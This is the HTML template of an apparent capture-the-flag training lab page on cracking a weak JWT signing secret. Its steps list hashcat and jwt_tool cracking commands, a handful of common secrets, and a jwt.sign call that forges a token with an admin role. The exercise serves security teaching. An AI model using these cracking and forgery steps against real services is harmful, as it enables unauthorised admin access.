<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>JWT Weak Secret - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/jwt"><i class="fas fa-flask"></i> JWT Labs</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>🎫 JWT Weak Secret Brute Force</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span><span class="lab-tag points"><i class="fas fa-star"></i> 25 pts</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>Brute force the JWT signing secret, then forge a new token with admin role.</p>
      <p><strong>Your token:</strong></p>
      <div class="code-block" style="word-break:break-all;"><%= token %></div>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> Steps</h2>
      <div class="code-block"># Crack with hashcat or jwt_tool:
hashcat -m 16500 jwt.txt wordlist.txt
# or
python3 jwt_tool.py TOKEN -C -d common_passwords.txt

# Common secrets to try: secret, password, key, admin, 123456
# Once cracked, forge: jwt.sign({user:'hacker',role:'admin'}, 'CRACKED_SECRET')</div>
      <div class="vulnerable-form">
        <label>Submit forged admin token:</label>
        <textarea id="jwtInput2" rows="3" placeholder="Forge a token with role:admin using the cracked secret"></textarea>
        <button onclick="verifyJwt2()" class="btn">Verify</button>
      </div>
      <div id="jwtResult2" class="result-box" style="margin-top:1rem;"></div>
    </div>
    <div class="flag-submit">
      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('jwt-weak-secret','flagInput_jwt2','flagResult_jwt2'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_jwt2" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_jwt2" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function verifyJwt2() {
      const res = await fetch('/labs/jwt/weak-secret/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token:document.getElementById('jwtInput2').value.trim()}) });
      document.getElementById('jwtResult2').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
    }
  </script>
</body>
</html>
